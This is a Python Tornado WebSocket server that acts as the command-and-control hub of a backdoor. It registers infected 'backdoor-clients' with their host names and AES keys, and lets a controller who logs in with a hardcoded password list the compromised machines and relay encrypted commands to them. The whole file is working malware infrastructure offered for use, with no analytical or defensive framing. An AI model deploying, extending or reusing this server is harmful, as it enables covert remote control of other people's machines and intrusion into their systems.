#!/usr/bin/env python
# -*- coding: utf-8 -*-
import tornado.web
import tornado.websocket
import tornado.ioloop
import json
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
__author__ = 'nekocode'

# config
PASSWORD = '110110zxc'


class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
    clients = list()

    def data_received(self, chunk):
        pass

    @staticmethod
    def send_to_all(message):
        for c in BackdoorSocketHandler.clients:
            c.write_message(json.dumps(message))

    def __init__(self, application, request, **kwargs):
        tornado.websocket.WebSocketHandler.__init__(self, application, request, **kwargs)
        self.HOST_NAME = None
        self.ID = None
        self.IV = '\0' * AES.block_size
        self.SECRET = None
        self.is_controller = False

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain

    def open(self):
        pass

    def send_data(self, data):
        self.write_message(self.encrypt(json.dumps({'data': data})))

    def on_message(self, message):
        if self.ID and self.SECRET:
            json_str = self.decrypt(message)
            msg = json.loads(json_str)

            if self.is_controller and 'cmd' in msg:
                command = msg['cmd']
                if command == 'list':
                    data = 'List all online backdoor-clients:\n'
                    for i in range(len(BackdoorSocketHandler.clients)):
                        client = BackdoorSocketHandler.clients[i]
                        data += str(i) + '\t' + client.ID + '\t' + self.request.remote_ip + '\t' + self.HOST_NAME + '\n'
                    self.send_data(data)
                elif 'to' in msg:
                    to = int(msg['to'])
                    if to < len(BackdoorSocketHandler.clients):
                        to_client = BackdoorSocketHandler.clients[to]
                        # todo
                        if not to_client == self:
                            to_client.write_message(to_client.encrypt(json_str))
                        self.send_data('OK.\n')
                    else:
                        self.send_data('Not available target.\n')

        else:
            msg = json.loads(message)

            if 'id' in msg:
                self.ID = msg['id']
                self.HOST_NAME = msg['host_name']
                self.SECRET = b64decode(msg['secret'])
                if 'pwd' in msg:
                    if PASSWORD == self.decrypt(msg['pwd']):
                        self.is_controller = True
                        self.send_data('login success')
                    else:
                        self.send_data('login failed')
                        return

                BackdoorSocketHandler.clients.append(self)
                print 'find new client: ' + self.request.remote_ip + '(' + self.ID + ')'

    def on_close(self):
        if self in BackdoorSocketHandler.clients:
            BackdoorSocketHandler.clients.remove(self)


def run_server():
    application = tornado.web.Application([
        (r'/', BackdoorSocketHandler)
    ])

    application.listen(8888, xheaders=True)
    tornado.ioloop.IOLoop.instance().start()


if __name__ == '__main__':
    run_server()

